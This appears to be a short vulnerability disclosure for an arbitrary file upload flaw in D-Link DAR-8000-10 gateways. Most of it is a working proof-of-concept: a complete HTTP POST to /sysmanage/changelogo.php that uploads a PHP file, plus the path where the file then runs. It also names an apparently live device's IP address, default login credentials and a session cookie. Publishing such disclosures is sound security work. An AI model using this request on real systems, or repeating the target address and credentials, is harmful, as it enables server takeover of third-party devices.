

The full version of the D-LINK DAR-8000-10 series online behavior audit gateway has a file upload vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-8000-10  DAR V31R02B1413C

Vulnerability Path ：/sysmanage/changelogo.php


Ip：https://59.60.19.174:8443/

Log in to the system using the default password：test/admin@123

POC：
```
POST /sysmanage/changelogo.php HTTP/1.1
Host: 59.60.19.174:8443
Cookie: PHPSESSID=eb22543a6a7b4ffd10816d515b505f7f
Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*
Accept-Language: zh-CN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)
Content-Type: multipart/form-data; boundary=---------------------------7e62f02f51878
Accept-Encoding: gzip, deflate
Content-Length: 326
Cache-Control: no-cache
Connection: close

-----------------------------7e62f02f51878
Content-Disposition: form-data; name="file_upload"; filename="phpinfo.php"
Content-Type: application/octet-stream

<?php phpinfo()?>
-----------------------------7e62f02f51878
Content-Disposition: form-data; name="mode"

upload
-----------------------------7e62f02f51878--

```
<img width="726" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/e3704d22-d80d-459e-8c3b-2f9d7333fbc7">

https://59.60.19.174:8443/boot/web/upload/diylogo/phpinfo.php

<img width="723" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/30362ba8-80b6-4f9a-bd4f-47601844974b">
